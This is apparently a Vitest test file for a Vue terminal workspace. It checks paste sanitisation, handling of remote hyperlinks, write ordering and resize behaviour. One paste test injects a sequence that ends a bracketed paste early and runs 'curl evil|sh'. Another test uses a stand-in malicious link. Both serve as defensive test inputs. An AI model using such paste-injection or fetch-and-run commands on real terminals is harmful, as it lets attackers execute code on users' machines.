import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { createPinia, setActivePinia } from "pinia";
import { flushPromises, mount, type VueWrapper } from "@vue/test-utils";
import { nextTick } from "vue";
import TerminalWorkspace from "./TerminalWorkspace.vue";
import { collectPanes, useTabsStore } from "../stores/tabs";
import { emitSessionClosed, getInvokeMock, setInvokeHandler } from "../test/setup";

type LinkHandler = { activate(event: MouseEvent, text: string, range: unknown): void; hover?: (...args: unknown[]) => void };
const terminals = vi.hoisted(() => ({
  items: [] as Array<{
    options: { linkHandler?: LinkHandler };
    output: string[];
    rawPastes: string[];
    bracketedPaste: boolean;
    input: (data: string) => void;
    binary: (data: string) => void;
  }>,
  // Size the next fit() gives the terminal.
  size: { cols: 80, rows: 24 },
}));
vi.mock("@xterm/xterm", () => ({ Terminal: class {
  cols = 80; rows = 24;
  options: Record<string, unknown>;
  textarea = document.createElement("textarea");
  output: string[] = [];
  rawPastes: string[] = [];
  bracketedPaste = true;
  input: (data: string) => void = () => {};
  binary: (data: string) => void = () => {};
  constructor(options: Record<string, unknown>) { this.options = options; terminals.items.push(this); }
  loadAddon(addon: { activate?: (terminal: unknown) => void }) { addon.activate?.(this); }
  attachCustomKeyEventHandler() {}
  open(container: HTMLElement) {
    const root = document.createElement("div"); root.className = "xterm";
    root.append(this.textarea); container.append(root);
    // Stands in for xterm's own listener, which forwards clipboard text as-is.
    this.textarea.addEventListener("paste", event => {
      const text = event.clipboardData?.getData("text/plain") ?? "";
      this.rawPastes.push(text);
      this.paste(text);
    });
  }
  onData(handler: (data: string) => void) { this.input = handler; }
  onBinary(handler: (data: string) => void) { this.binary = handler; }
  // Mirrors xterm's paste(): normalize line endings, then bracket.
  paste(text: string) {
    const prepared = text.replace(/\r?\n/g, "\r");
    this.input(this.bracketedPaste ? `\x1b[200~${prepared}\x1b[201~` : prepared);
  }
  focus() { this.textarea.focus(); }
  write(data: string | Uint8Array, callback?: () => void) {
    this.output.push(typeof data === "string" ? data : new TextDecoder().decode(data));
    callback?.();
  }
  reset() { this.output.length = 0; }
  dispose() { this.textarea.remove(); }
} }));
vi.mock("@xterm/addon-fit", () => ({ FitAddon: class {
  terminal?: { cols: number; rows: number };
  activate(terminal: { cols: number; rows: number }) { this.terminal = terminal; }
  fit() { Object.assign(this.terminal!, terminals.size); }
} }));
vi.mock("@xterm/addon-search", () => ({ SearchAddon: class { clearDecorations() {} onDidChangeResults() { return () => {}; } } }));

let view: VueWrapper | undefined;
let resizeObservers: Array<() => void> = [];
const calls = (command: string) => getInvokeMock().mock.calls.filter(([name]) => name === command);
const written = () => calls("session_write").map(([, args]) => ({ id: args.sessionId as string, bytes: args.data as number[] }));
const text = (bytes: number[]) => new TextDecoder().decode(new Uint8Array(bytes));
async function begin() {
  const tab = useTabsStore().newTab();
  const pane = collectPanes(tab.tree)[0];
  view = mount(TerminalWorkspace, { props: { visible: true }, attachTo: document.body });
  await vi.waitFor(() => expect(pane.connected).toBe(true));
  return { pane, terminal: terminals.items[0] };
}
function holdWrites() {
  const pending: Array<{ resolve: () => void; reject: (error: Error) => void }> = [];
  setInvokeHandler("session_write", () => new Promise<void>((resolve, reject) => { pending.push({ resolve, reject }); }));
  return pending;
}
function paste(data: string) {
  const event = new Event("paste", { bubbles: true, cancelable: true });
  Object.defineProperty(event, "clipboardData", { value: { getData: (type: string) => type === "text/plain" ? data : "" } });
  view!.get("textarea").element.dispatchEvent(event);
  return event;
}
function resizeTo(cols: number, rows: number) {
  terminals.size = { cols, rows };
  resizeObservers.forEach(callback => callback());
}

beforeEach(() => {
  setActivePinia(createPinia());
  terminals.items.length = 0;
  terminals.size = { cols: 80, rows: 24 };
  resizeObservers = [];
  document.body.innerHTML = "";
  vi.stubGlobal("ResizeObserver", class {
    constructor(callback: () => void) { resizeObservers.push(callback); }
    observe() {} disconnect() {}
  });
  vi.spyOn(HTMLElement.prototype, "clientWidth", "get").mockReturnValue(800);
  vi.spyOn(HTMLElement.prototype, "clientHeight", "get").mockReturnValue(600);
});
afterEach(() => { view?.unmount(); view = undefined; vi.restoreAllMocks(); vi.unstubAllGlobals(); });

describe("terminal paste", () => {
  it("cannot end a bracketed paste early and run the rest as typed input", async () => {
    const { pane, terminal } = await begin();
    const event = paste("ls\x1b[201~curl evil|sh\r");
    await flushPromises();
    expect(event.defaultPrevented).toBe(true);
    expect(terminal.rawPastes).toEqual([]);
    expect(written()).toEqual([{ id: pane.sessionId, bytes: expect.any(Array) }]);
    expect(text(written()[0].bytes)).toBe("\x1b[200~ls[201~curl evil|sh\r\x1b[201~");
  });

  it("strips the single-byte CSI as well as ESC", async () => {
    const { terminal } = await begin();
    terminal.bracketedPaste = false;
    paste("a\x9b201~b\x1bc\x00d\x07");
    await flushPromises();
    expect(written().map(write => text(write.bytes))).toEqual(["a201~bcd"]);
  });

  it("keeps multi-line and non-ASCII pastes intact", async () => {
    await begin();
    paste("echo héllo\n\tcd /tmp\r\nls ✓\n");
    await flushPromises();
    expect(written().map(write => text(write.bytes))).toEqual(["\x1b[200~echo héllo\r\tcd /tmp\rls ✓\r\x1b[201~"]);
  });

  it("leaves typed control input alone", async () => {
    const { terminal } = await begin();
    terminal.input("\x1b[A");
    await flushPromises();
    terminal.input("\x03");
    await flushPromises();
    expect(written().map(write => text(write.bytes))).toEqual(["\x1b[A", "\x03"]);
  });
});

describe("terminal hyperlinks", () => {
  it("never opens a window for an OSC 8 link from the remote", async () => {
    const { terminal } = await begin();
    const open = vi.spyOn(window, "open");
    const confirm = vi.spyOn(window, "confirm");
    const handler = terminal.options.linkHandler!;
    expect(handler).toBeDefined();
    handler.hover?.(new MouseEvent("mouseover"), "https://evil.example.test", {});
    handler.activate(new MouseEvent("click"), "https://evil.example.test", {});
    expect(open).not.toHaveBeenCalled();
    expect(confirm).not.toHaveBeenCalled();
  });
});

describe("terminal write ordering", () => {
  it("keeps one write in flight and sends input typed meanwhile, in order, as the next write", async () => {
    const { pane, terminal } = await begin();
    const pending = holdWrites();
    terminal.input("a");
    terminal.input("b");
    terminal.binary("\x1b[M\xff\x80");
    terminal.input("c");
    expect(written().map(write => text(write.bytes))).toEqual(["a"]);
    pending[0].resolve();
    await flushPromises();
    expect(written()).toHaveLength(2);
    expect(written()[1]).toEqual({ id: pane.sessionId, bytes: [0x62, 0x1b, 0x5b, 0x4d, 0xff, 0x80, 0x63] });
    pending[1].resolve();
    await flushPromises();
    expect(written()).toHaveLength(2);
  });

  it("sends mouse reports from binary events as raw bytes", async () => {
    const { terminal } = await begin();
    terminal.binary("\x1b[M\x20\xa1\xff");
    await flushPromises();
    expect(written().map(write => write.bytes)).toEqual([[0x1b, 0x5b, 0x4d, 0x20, 0xa1, 0xff]]);
  });

  it("reports a failed write and still sends the input held behind it", async () => {
    const { terminal } = await begin();
    const pending = holdWrites();
    terminal.input("a");
    terminal.input("b");
    pending[0].reject(new Error("WRITE_FAILURE"));
    await flushPromises();
    expect(terminal.output.join("")).toContain("Write failed: Error: WRITE_FAILURE");
    expect(written().map(write => text(write.bytes))).toEqual(["a", "b"]);
  });

  it("never hands held input to a replacement session, nor makes it wait for the old write", async () => {
    const { pane, terminal } = await begin();
    const oldId = pane.sessionId;
    const pending = holdWrites();
    terminal.input("old-1");
    terminal.input("old-2");
    emitSessionClosed(oldId);
    await nextTick();
    await view!.get('[role="alert"] button').trigger("click");
    await vi.waitFor(() => expect(pane.connected).toBe(true));
    expect(pane.sessionId).not.toBe(oldId);
    terminal.input("new");
    expect(written().map(write => [write.id, text(write.bytes)])).toEqual([[oldId, "old-1"], [pane.sessionId, "new"]]);
    pending[0].resolve();
    pending[1].resolve();
    await flushPromises();
    expect(written()).toHaveLength(2);
  });
});

describe("terminal resize", () => {
  const resizes = () => calls("session_resize").map(([, args]) => [args.sessionId, args.cols, args.rows]);

  it("sends a window change only when the size differs from what the session has", async () => {
    const { pane } = await begin();
    expect(calls("create_local_terminal")[0][1]).toMatchObject({ cols: 80, rows: 24 });
    resizeTo(80, 24);
    await flushPromises();
    expect(resizes()).toEqual([]);
    resizeTo(100, 30);
    resizeTo(100, 30);
    await flushPromises();
    expect(resizes()).toEqual([[pane.sessionId, 100, 30]]);
  });

  it("opens a replacement session at the current size", async () => {
    const { pane } = await begin();
    resizeTo(100, 30);
    const oldId = pane.sessionId;
    emitSessionClosed(oldId);
    await nextTick();
    await view!.get('[role="alert"] button').trigger("click");
    await vi.waitFor(() => expect(pane.connected).toBe(true));
    expect(calls("create_local_terminal")[1][1]).toMatchObject({ sessionId: pane.sessionId, cols: 100, rows: 30 });
    resizeTo(100, 30);
    resizeTo(120, 40);
    await flushPromises();
    expect(resizes()).toEqual([[oldId, 100, 30], [pane.sessionId, 120, 40]]);
  });

  it("sends one resize at a time and then only the latest size", async () => {
    const { pane } = await begin();
    const pending: Array<() => void> = [];
    setInvokeHandler("session_resize", () => new Promise<void>(resolve => { pending.push(resolve); }));
    resizeTo(100, 30);
    await flushPromises();
    resizeTo(110, 35);
    resizeTo(120, 40);
    await flushPromises();
    expect(resizes()).toEqual([[pane.sessionId, 100, 30]]);
    pending[0]();
    await flushPromises();
    expect(resizes()).toEqual([[pane.sessionId, 100, 30], [pane.sessionId, 120, 40]]);
    pending[1]();
    await flushPromises();
    resizeTo(120, 40);
    await flushPromises();
    expect(resizes()).toHaveLength(2);
  });

  it("retries a size whose resize failed", async () => {
    const { pane } = await begin();
    setInvokeHandler("session_resize", () => Promise.reject(new Error("fixture failure")));
    resizeTo(100, 30);
    await flushPromises();
    setInvokeHandler("session_resize", () => undefined);
    resizeTo(100, 30);
    await flushPromises();
    expect(resizes()).toEqual([[pane.sessionId, 100, 30], [pane.sessionId, 100, 30]]);
  });
});
